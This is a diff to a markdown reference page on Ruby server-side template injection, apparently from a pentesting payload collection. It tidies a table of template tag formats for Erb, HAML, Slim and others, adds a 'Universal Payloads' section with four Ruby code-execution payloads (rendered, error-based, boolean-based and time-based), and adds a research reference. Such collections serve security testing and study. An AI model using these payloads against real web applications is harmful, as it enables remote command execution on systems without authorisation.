@@ -5,6 +5,7 @@
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
+- [Universal Payloads](#universal-payloads)
 - [Ruby](#ruby)
     - [Ruby - Basic injections](#ruby---basic-injections)
     - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
@@ -15,14 +16,27 @@
 ## Templating Libraries
 
 | Template Name | Payload Format |
-| ------------ | --------- |
-| Erb      | `<%= %>`   |
-| Erubi    | `<%= %>`   |
-| Erubis   | `<%= %>`   |
-| HAML     | `#{ }`     |
-| Liquid   | `{{ }}`    |
-| Mustache | `{{ }}`    |
-| Slim     | `#{ }`     |
+|---------------|----------------|
+| Erb           | `<%= %>`       |
+| Erubi         | `<%= %>`       |
+| Erubis        | `<%= %>`       |
+| HAML          | `#{ }`         |
+| Liquid        | `{{ }}`        |
+| Mustache      | `{{ }}`        |
+| Slim          | `#{ }`         |
+
+## Universal Payloads
+
+Generic code injection payloads work for many Ruby-based template engines, such as Erb, Erubi, Erubis, HAML and Slim.
+
+To use these payloads, wrap them in the appropriate tag.
+
+```ruby
+%x('id') # Rendered RCE
+File.read("Y:/A:/"+%x('id')) # Error-Based RCE
+1/(system("id")&&1||0) # Boolean-Based RCE
+system("id && sleep 5") # Time-Based RCE
+```
 
 ## Ruby
 
@@ -74,3 +88,4 @@ Execute code using SSTI for **Slim** engine.
 ## References
 
 - [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
